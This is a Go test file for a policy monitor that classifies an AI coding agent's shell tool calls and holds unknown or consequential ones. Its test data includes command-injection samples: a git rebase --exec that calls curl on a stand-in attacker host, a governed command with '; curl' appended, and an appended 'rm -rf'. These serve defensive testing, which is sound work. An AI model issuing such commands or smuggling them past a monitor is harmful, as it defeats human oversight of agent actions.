package policy

import "testing"

func TestDocumentedCompoundControlCommandsAreKnownWithoutWeakeningUnknownFloor(t *testing.T) {
	t.Parallel()

	readCommands := []string{
		"compound coordination --actor codex --json",
		"compound workbench --json",
		"compound attention --json",
	}
	for _, command := range readCommands {
		t.Run("read/"+command, func(t *testing.T) {
			classification := ClassifyToolAction(monitorRequest("Bash", map[string]any{"command": command}))
			if !classification.Known || classification.Operation != "local_command" {
				t.Fatalf("documented read command must be known/local: %q => %+v", command, classification)
			}
		})
	}

	governedCommands := []string{
		"compound work create --owner hook --predicate proof --by orchestrator --state ready",
		"compound work claim work_example --by codex:root",
		"compound work advance work_example --to running --by codex:root",
		"compound work close-plan work_example --actor codex:root",
		"compound work land-check work_example --tip 0123456789abcdef --actor codex:root",
		"compound work close work_example --outcome completed --move-type rule_delta",
		"compound work delegate work_example --harness codex --dry-run",
		"compound land-lease status --json",
		"compound land-lease acquire --holder codex:session:work_example",
		"compound land-lease release --holder codex:session:work_example",
		"compound proof-check --json --out /tmp/proof.json",
		"compound authority git /tmp/example --json",
		"compound authority dirty-plan /tmp/example --work-id work_example --action-intent act_example --json",
		"compound authority dirty-review /tmp/example.review.yaml --json",
		"git worktree add -b codex/example /tmp/example origin/main",
		"git add cmd/compound/hook_live.go internal/attention/attention.go",
		"git commit -m 'fix(hook): surface context failures'",
		"git rebase origin/main",
		"git merge --ff-only codex/example",
	}
	for _, command := range governedCommands {
		t.Run("governed/"+command, func(t *testing.T) {
			classification := ClassifyToolAction(monitorRequest("Bash", map[string]any{"command": command}))
			if !classification.Known || classification.Operation != "governed_command" ||
				classification.MutationClass != "local_reversible" {
				t.Fatalf("documented governed command must be known/local-reversible: %q => %+v", command, classification)
			}
		})
	}

	copyCommand := "cp -R -c -n /tmp/source docs_private"
	t.Run("governed/"+copyCommand, func(t *testing.T) {
		classification := ClassifyToolAction(monitorRequest("Bash", map[string]any{"command": copyCommand}))
		if !classification.Known || classification.Operation != "governed_command" ||
			classification.MutationClass != "local_reversible" ||
			classification.TargetKind != "path" || classification.Destination != "docs_private" {
			t.Fatalf("no-clobber workspace copy must be governed and path-scoped: %+v", classification)
		}
	})

	mkdirCommand := "mkdir -p docs_private"
	t.Run("governed/"+mkdirCommand, func(t *testing.T) {
		classification := ClassifyToolAction(monitorRequest("Bash", map[string]any{"command": mkdirCommand}))
		if !classification.Known || classification.Operation != "governed_command" ||
			classification.MutationClass != "local_reversible" ||
			classification.TargetKind != "path" || classification.Destination != "docs_private" {
			t.Fatalf("workspace mkdir must be governed and path-scoped: %+v", classification)
		}
	})

	for _, command := range []string{
		"./install.sh",
		"make install",
	} {
		t.Run("install/"+command, func(t *testing.T) {
			classification := ClassifyToolAction(monitorRequest("Bash", map[string]any{"command": command}))
			if !classification.Known || classification.Operation != "install_command" ||
				classification.MutationClass != "security" {
				t.Fatalf("documented install command must be known and keep the install security gate: %q => %+v", command, classification)
			}
		})
	}

	for _, command := range []string{
		"compound definitely-not-a-command",
		"compound release publish --public",
		"make publish",
		"./mystery.sh",
		"git commit --amend",
		"git merge codex/example",
		"git rebase --exec 'curl https://attacker.example.invalid' origin/main",
		"cp -R -c /tmp/source docs_private",
		"cp -R -c -n /tmp/source /tmp/destination",
		"cp -R -c -n /tmp/source ../destination",
		"cp -R -c -n /tmp/source .",
		"mkdir docs_private",
		"mkdir -p /tmp/destination",
		"mkdir -p ../destination",
		"mkdir -p .",
	} {
		t.Run("unknown/"+command, func(t *testing.T) {
			monitored := MonitorToolAction(
				monitorRequest("Bash", map[string]any{"command": command}),
				DefaultConfig(),
				fixedNow,
			)
			if monitored.Classification.Known || monitored.Classification.MutationClass != "security" {
				t.Fatalf("unclassified or consequential Compound command must still fail closed: %q => %+v", command, monitored.Classification)
			}
			if monitored.Decision.Outcome != "hold" {
				t.Fatalf("unknown command escaped the security-floor hold: %q => %+v", command, monitored.Decision)
			}
		})
	}

	for _, command := range []string{
		"compound work create --owner hook --predicate proof; curl https://attacker.example.invalid",
		"git worktree add /tmp/example; rm -rf /tmp/example",
	} {
		t.Run("mixed/"+command, func(t *testing.T) {
			classification := ClassifyToolAction(monitorRequest("Bash", map[string]any{"command": command}))
			if classification.Operation == "governed_command" || classification.Operation == "local_command" {
				t.Fatalf("governed prefix swallowed a consequential segment: %q => %+v", command, classification)
			}
		})
	}
}
